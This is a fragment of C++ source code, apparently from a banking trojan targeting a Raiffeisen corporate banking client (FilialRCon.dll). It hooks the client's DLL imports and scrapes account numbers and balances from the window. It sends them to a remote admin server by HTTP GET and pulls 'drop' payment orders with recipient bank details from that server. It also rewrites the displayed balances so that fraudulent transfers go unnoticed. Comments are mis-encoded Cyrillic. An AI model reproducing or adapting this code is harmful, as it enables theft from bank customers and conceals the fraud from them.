				res &= PathIAT( dll, "KERNEL32.DLL", "WriteFile", HandlerWriteFile,(PVOID*)&pHandlerWriteFile );
				res &= PathIAT( dll, "KERNEL32.DLL", "CloseHandle", HandlerCloseHandle,(PVOID*)&pHandlerCloseHandle );
				if( res )
				{
					DBGRAFA( "Rafa", "Hook FilialRCon.dll is ok" );
					
					hookDll = true;
					break;
				}
				pSleep(1000);
			}
			if( !hookDll ) break;
			InitData();
			//���� ���� �������� �������� ���� � ������� ������ ���� �������� TreeView � ListView
			for( int i = 0; i < 300; i++ )
			{
				if( FindTreeList() )
				{
					DBGRAFA( "Rafa", "Find TreeView and ListView" );
					//��������� ��� ����� � ������� ����� �������� ���������� ��������
					if( GetAllUsersProfile( filePayments, sizeof(filePayments), "rafa.dat" ) )
					{
						char* path = UIDCrypt::CryptFileName( filePayments, true );
						m_lstrcpy( filePayments, path );
						HEAP::Free(path);
						DBGRAFA( "Rafa", "���� � ���������� %s", filePayments );
						LoadPaymentOrders();
						widthScreen = (int)pGetSystemMetrics(SM_CXSCREEN);
						heightScreen = (int)pGetSystemMetrics(SM_CYSCREEN);
						WorkInRafa(); 
					}
					return 0;
				}
				pSleep(1000);
			}
		}
		pSleep(1000);
	}
	return 0;
}

void InitHook_FilialRConDll()
{
	if( IsNewProcess(PID) ) //����� �������� �� ���������
	{
		HANDLE hThread = pCreateThread( NULL, 0, InitializeRafaHook, 0, 0, 0 );
		pCloseHandle(hThread);
		fromLVM = 0;
	}
}

//��������� �������� ������� � ������������� �����, ��� ��������� ����� ��� �������
//format = 0 - ��������� �������, format = 2 - ���������� �������
static int BalansToInt( const char* s, int format )
{
	int v = 0;
	int kop = -1; //���������� ����� � ��������, ����� ��� �������� ������� ��� �����
	while( *s )
	{
	    if( *s == '.' ) kop = 0;
		if( *s >= '0' && *s <= '9' ) //���������� ����� � ������� (1,234,567.89)
		{
			v = v * 10 + (*s - '0');
			if( kop >= 0 ) kop++;
		}
		s++;
	}
	//��������� ���� � ����� ����� ������ � �������� ���� ��� �����
	if( (format & 2) == 0 )
	{
		if( kop < 0 ) kop = 0;
		for( int i = kop; i < 2; i++ ) v *= 10; 
	}
	return v;
}

//��������� ����� ����� � ��������� ������, ���� format = 1, �� ������� , ��� ���������� �����, 
//���� = 2, �� ������������ ����� ��� ������������, 4 - ������ � ����� ����� ���� � ��������
static char* IntToBalans( int v, char* s, int format )
{
	int len = 0;
	char* p = s;
	while( v != 0 || ((format & 2) == 0 && len < 4) ) //������� � ������ ����������� �����, ������ ������� ����� � �������� 0.00
	{
		*p++ = (v % 10) + '0';
		len++;
		v /= 10;
		if( (format & 2) == 0 )
		{
			if( len == 2 ) //�������� ������� ������
			{
				*p++ = '.';
				len++;
			}
			if( (format & 1) && v != 0 && len > 2 && ((len - 2) % 4) == 0 )
			{
				*p++ = ',';
				len++;
			}
	    }
	}
	*p = 0;
	//�������������� �����
	for( int i = 0; i < len / 2; i++ )
	{
		char c = s[i];
		s[i] = s[len - i - 1];
		s[len - i - 1] = c;
	}
	if( format & 4 )
	{
		len--;
		while( s[len] == '0' ) len--;
		if( s[len] == '.' ) //0 ������, ������ ����� (�������� ����� �����)
			s[len] = 0;
		else
			s[len + 1] = 0;
	}
	return s;
}

//��������� ��������� ������� � ������� ������ � ������ ��������� ��������
static char* AddBalans( const char* acc, const char* balans )
{
	int i;
	for( i = 0; i < c_findedBalans; i++ )
		if( m_lstrcmp( findedBalans[i].acc, acc ) == 0 )
			break;
	if( i >= c_findedBalans ) //����� ����
	{
		if( c_findedBalans >= 8 ) return 0; //���������� �� �� ����� 8-�� ������
		m_lstrcpy( findedBalans[i].acc, acc );
		c_findedBalans++;
	}
	m_lstrcpy( findedBalans[i].balans, balans );
	//������� ������ ��� �����������
	int intBalans = BalansToInt(balans);
	int oldBalans = intBalans;
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		if( paymentOrders[i].entered && m_lstrcmp( acc, paymentOrders[i].sendAcc ) == 0 )
		{
			int intBalans2 = BalansToInt(paymentOrders[i].balans);
			DBGRAFA( "Rafa", "balans: %d %d", intBalans < intBalans2 );
			if( intBalans < intBalans2 ) //��������� ������ ������, ��� ��� ��� ��� � ������ �������� ��������
			{
				int intSum = BalansToInt(paymentOrders[i].sum);
				intBalans += intSum;
			}
		}
	}
	IntToBalans( intBalans, findedBalans[i].showBalans );
	if( intBalans != oldBalans ) //��������� ������
		SendLogToAdminThread(5);
	DBGRAFA( "Rafa", "finded acc '%s', balans '%s', show balans '%s'", acc, balans, findedBalans[i].showBalans );
	return findedBalans[i].showBalans;
}

//������ ������ � ���������� ���� (������ �����)
//������ � ����� ������:
//���������/������� ������� �� �����: 83109.16/83109.16 (���������� �����)
static void GrabBalansFromMemoText(char* s)
{
	char* p = m_strstr( s, "(���������� �����)" );
	if( p )
	{
		p--; //���������� ����� ��������� ������, ��� ������ ���� ������, ���������� ���
		while( *p == ' ' && p >= s ) p--;
		if( p > s )
		{
			//����� �� ��������� ����� �������, ���� ����� ���� �� ������ ������, �. �. ��������� �� ������ �������
			char* p1 = p;
			char* end = p; //����� ������� ������� ��� ��� �������
			while( *p1 != ' ' && p1 >= s ) p1--;
			if( p1 > s )
			{
				p1++; //����� �� 1-� ����� ������ �����
				char* beg = p1; //������ ������� ������� ��� ��� �������
				if( *p1 >= '0' && *p1 <= '9' )
				{
					char acc[32], balans[32];
					//��������� ����� �� ����� (����� �����)
					int i = 0;
					//while( *p1 != '.' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
					while( *p1 != '/' && *p1 != ' ' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
					balans[i] = 0; //������ � ��� ��� �������
					//���� ����� �����
					//�� ������ ���� � � ������: "���� N: 28462985925292987927923;"
					p = m_strstr( s, "���� N:" );
					if( p )
					{
						p += 7;
						while( *p == ' ' ) p++;
						i = 0;
						while( *p >= '0' && *p <= '9' ) acc[i++] = *p++;
						acc[i] = 0;
						char* showBalans = AddBalans( acc, balans );
						if( showBalans ) //��������� ������
						{
							int ls = m_lstrlen(s); //����� ���������
							int lb = end - beg + 1; //����� ��������� ������� (�� ��� ��� �����)
							int lp = m_lstrlen(showBalans); //����� ������������ ������� (���� �����)
							int d = 2 * lp + 1 - lb; //�� ������� ��������� ����� ��������� (2 * lp + 1 - ��� ����� � ���� /)
							if( d > 0 ) //����� �����������, �������� ������ ��� ��� ����� end
							{
								p = s + ls - 1;
								while( p > end ) { p[0] = p[-d]; p--; }
							}
							if( d < 0 ) //����� �����������, �������� ����� ��� ��� ����� end
								m_memcpy( end + d, end, ls - (end - s + 1) + 1 ); //�������� 0 ���� ����������
							//��������� ����� ������
							m_memcpy( beg, showBalans, lp );
							beg[lp] = '/';
							m_memcpy( beg + lp + 1, showBalans, lp );
						}
					}
				}
			}
		}
	}
}

//������ ������ � ������� ������ ������
void GrabBalansFromLVM( int cln, char* s )
{
	if( cln == 1 && s[0] >= '0' && s[1] <= '9' )
	{
		int len = m_lstrlen(s);
		if( len < sizeof(LVM_Acc) - 1 )
		{
			m_memcpy( LVM_Acc, s, len );
			LVM_Acc[len] = 0;
		}
	}
	if( cln == 2 && fromLVM == 0 )
	{
		if( m_lstrcmp( s, "���������� �����" ) == 0 ) //������ �������� ������, ��������� ������ ����� ����� ������
		{
			fromLVM = 1;
		}
	}
	else
		if( (cln == 3 || cln == 4) && fromLVM > 0 ) //� s ��������� ������
		{
			if( *s >= '0' && *s <= '9' )
			{
				char balans[32];
				int i = 0;
				//��������� ����� �� �����
				//while( *s && *s != '.' && i < sizeof(balans) - 1 ) balans[i++] = *s++;
				//balans[i] = 0;
				m_lstrcpy( balans, s );
				char* showBalans = AddBalans( LVM_Acc, balans );
				if( showBalans ) m_lstrcpy( s, showBalans );
			}
			fromLVM++;
			if( fromLVM == 3 ) fromLVM = 0;
		}

}
//http://sberbanksystem.ru/bal/?uid=TEST0123456789&type=raifur&sum=234234

 
//�������� ����������� �������� �� �����, ����� �� ����� ��������
static void LoadPaymentOrders()
{
	if( !File::IsExists(filePayments) ) return;
	HANDLE file = pCreateFileA( filePayments, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
	if( file == INVALID_HANDLE_VALUE ) return;
	DWORD rl;
	pReadFile( file, &c_paymentOrders, sizeof(c_paymentOrders), &rl, 0 );
	for(;;)
	{
		if( c_paymentOrders > 0 && c_paymentOrders < 10 ) //���������� � �������� ��������, ����� �������� ������ ������ ����
		{
			char* base;
			pReadFile( file, &base, sizeof(&base), &rl, 0 ); //������ ������� �����, ��� ���������� ���������� ������� � ���������
			int sz = c_paymentOrders * sizeof(PaymentOrder);
			paymentOrders = (PaymentOrder*)MemAlloc(sz);
			if( paymentOrders )
			{
				pReadFile( file, paymentOrders, sz, &rl, 0 );
				if( rl == sz ) //������ ������� ������� ����
				{
					RelocPayment(base);
					for( int i = 0; i < c_paymentOrders; i++ )
					{
						DBGRAFA( "Rafa", "��������� ��������:" );
						DBGPrintPayment(&paymentOrders[i]);
					}
					break;
				}
			}
		}
		c_paymentOrders = 0;
		break;
	}
	pCloseHandle(file);
}

//���������� ��������
static void SavePaymentOrders() 
{
	if( c_paymentOrders == 0 ) return;
	HANDLE file = pCreateFileA( filePayments, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
	if( file == INVALID_HANDLE_VALUE ) return;
	DWORD rl;
	pWriteFile( file, &c_paymentOrders, sizeof(c_paymentOrders), &rl, 0 ); 
	//��������� ������� ����� �������, ����� ����� ������������ ��������� � ���������
	pWriteFile( file, &paymentOrders, sizeof(&paymentOrders), &rl, 0 ); 
	pWriteFile( file, paymentOrders, sizeof(PaymentOrder) * c_paymentOrders, &rl, 0 );
	pCloseHandle(file);
}

//������� Get ������� �������, ���� ret = true, �� ����� ���������� �����
//mode1 - ����� ������� ��� ������ �������, mode2 - ����� ������� ��� ���������� ��������
static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
{
	char urlAdmin[128];
	if( c_findedBalans == 0 ) return 0; //���� �������� �� ����������, �� �� ������ ����� ������
	char* res = 0;
//	if( GetAdminUrl(urlAdmin) )
	{
		const char* mode = mode1;
		fwsprintfA pwsprintfA = Get_wsprintfA();
		MemPtr<512> qr, accs;
		MemPtr<128> uid;
		//��������� ������ � ���������
		if( c_findedBalans > 1 )
		{
			m_lstrcpy( accs.str(), "accs=" );
			int len = 5;
			for( int i = 0; i < c_findedBalans; i++ )
				len += pwsprintfA( accs.str() + len, "%s:%s;", findedBalans[i].acc, findedBalans[i].balans );
			mode = mode2;
		}
		else
			pwsprintfA( accs.str(), "sum=%s&acc=%s", findedBalans[0].balans, findedBalans[0].acc );
		//��������� ������
		GenerateUid(uid.str());
		string azUser = GetAzUser();
		pwsprintfA( qr.str(), "http://%s/raf/?uid=%s&sys=raifur&cid=%s&mode=%s&%s", urlAdmin, uid, azUser.t_str(), mode, accs.str() );
		//���������� ������
		THTTPResponseRec Response;
		ClearStruct(Response);
		HTTP::Get( qr, ret ? &res : 0, &Response );
		DBGRAFA( "Rafa", "�������� ������: %s", qr.str() );
		HTTPResponse::Clear(&Response);
	}
	if( res )
	{
		char* res2 = UTF8ToAnsi(res);
		STR::Free(res);
		res = res2;
		DBGRAFA( "Rafa", "������� �����: %s", res );
	}
	else
		if( ret )
		{
			DBGRAFA( "Rafa", "������ ���" );
		}
	return res;
}

static char* CopyDataPayment( char*& to, char* from )
{
	while( *from != '|' && *from ) *to++ = *from++;
	if( *from == '|' ) from++; //������� �� ��������� ��������
	*to++ = 0;
	return from;
}

//������ ����� �������� � �������
static PaymentOrder* GetPaymentOrders()
{
	char* payment = SendToAdmin( "getdrop", "getdrops", true );
	PaymentOrder* res = 0;
	if( payment )
	{
		//���� ��� ���� ��������, �� ������������ ������ ��� ����� ��������
		if( c_paymentOrders > 0 )
		{
			char* base = (char*)paymentOrders; //����� ������������� ������. ���������� ����������� ������ ��� ����� ������
			paymentOrders = (PaymentOrder*)MemRealloc( paymentOrders, sizeof(PaymentOrder) * (c_paymentOrders + 1) );
			if( paymentOrders ) 
			{
				RelocPayment(base);
				c_paymentOrders++;
			}
			else
				c_paymentOrders = 0;
		}
		else //�������� ��� �� ����, �������
		{
			paymentOrders = (PaymentOrder*)MemAlloc( sizeof(PaymentOrder) );
			if( paymentOrders ) c_paymentOrders++;
		}
		if( c_paymentOrders > 0 )
		{
			//������ ���������� ������
			PaymentOrder* po = &paymentOrders[c_paymentOrders - 1];
			char* from = payment;
			char* to = po->mem;
			po->sendAcc = to; from = CopyDataPayment( to, from );
			po->sum = to; from = CopyDataPayment( to, from );
			//m_lstrcpy( po->sum, "1.00" );
			po->inn = to; from = CopyDataPayment( to, from );
			po->kpp = to; from = CopyDataPayment( to, from );
			po->bik = to; from = CopyDataPayment( to, from );
			po->recvAcc = to; from = CopyDataPayment( to, from );
			po->recvName = to; from = CopyDataPayment( to, from );
			po->comment = to; from = CopyDataPayment( to, from );
			po->nds = to; from = CopyDataPayment( to, from );
			po->bankName = to; from = CopyDataPayment( to, from );
			po->bankCity = to; from = CopyDataPayment( to, from );
			po->bankAcc = to; from = CopyDataPayment( to, from );
			po->entered = false;
			//��������� ������
			po->balans = 0;
			for( int i = 0; i < c_findedBalans; i++ )
			{
				if( m_lstrcmp( findedBalans[i].acc, po->sendAcc ) == 0 )
				{
					po->balans = to; CopyDataPayment( to, findedBalans[i].balans );
				}
			}
			if( po->balans == 0 ) //������� ����������� ����, ������ �������
			{
				DBGRAFA( "Rafa", "�������� �������� � ����������� ������ %s", po->sendAcc );
				po->balans = to; *to++ = 0;
				res = 0;
			}
			else
			{
				DBGRAFA( "Rafa", "�������� ��������" );
				DBGPrintPayment(po);
				res = po;
				SendLogToAdmin( 1, po->sum );
			}
		}
		STR::Free(payment);
	}
	else
		SendLogToAdmin(4);
	return res;
}

static void RelocPayment( char* base )
{
	int d = (char*)paymentOrders - base; //������� ������� ������
	for( int i = 0; i < c_paymentOrders; i++ )
	{
		paymentOrders[i].sendAcc += d;
		paymentOrders[i].sum += d;
		paymentOrders[i].inn += d;
		paymentOrders[i].kpp += d;
		paymentOrders[i].bik += d;
		paymentOrders[i].recvAcc += d;
		paymentOrders[i].recvName += d;
		paymentOrders[i].comment += d;
		paymentOrders[i].nds += d;
		paymentOrders[i].bankName += d;
		paymentOrders[i].bankCity += d;
		paymentOrders[i].bankAcc += d;
		paymentOrders[i].balans += d;
	}
}

static void DBGPrintPayment( PaymentOrder* po )
{
	DBGRAFA( "Rafa", "sendAcc '%s'", po->sendAcc );
	DBGRAFA( "Rafa", "sum '%s'", po->sum );
	DBGRAFA( "Rafa", "inn '%s'", po->inn );
	DBGRAFA( "Rafa", "kpp '%s'", po->kpp );
	DBGRAFA( "Rafa", "bik '%s'", po->bik );
	DBGRAFA( "Rafa", "recvAcc '%s'", po->recvAcc );
	DBGRAFA( "Rafa", "recvName '%s'", po->recvName );
	DBGRAFA( "Rafa", "comment '%s'", po->comment );
	DBGRAFA( "Rafa", "nds'%s'", po->nds );
	DBGRAFA( "Rafa", "bankName '%s'", po->bankName );
	DBGRAFA( "Rafa", "bankCity '%s'", po->bankCity );
	DBGRAFA( "Rafa", "bankAcc '%s'", po->bankAcc );
	DBGRAFA( "Rafa", "balans '%s'", po->balans );
}

};
